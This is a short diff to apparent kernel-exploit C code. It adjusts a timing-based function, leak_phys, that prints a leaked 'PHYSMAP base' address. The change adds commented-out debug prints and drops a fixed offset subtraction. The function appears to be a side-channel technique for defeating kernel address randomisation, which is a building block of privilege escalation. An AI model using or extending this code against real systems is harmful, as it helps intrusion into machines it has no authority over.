@@ -124,6 +124,10 @@ uint64_t leak_phys(void)
                 data[idx] += time;
         }
     }
+    // for(int i = 0 ; i < 0x100; i++)
+    // {
+    //     printf("[x] %p\n",data[i]);
+    // }
     for (int i = 0x40; i < ARR_SIZE_PHYS; i++)
     {
         data[i] /= ITERATIONS;
@@ -160,7 +164,7 @@ uint64_t leak_phys(void)
     return addr;
 }
 size_t leakPHYS(size_t offset){
-    size_t val =  leak_phys()-0x100000000;
+    size_t val =  leak_phys();
     printf ("PHYSMAP base %p\n",(void *)val);
     return val;
 }
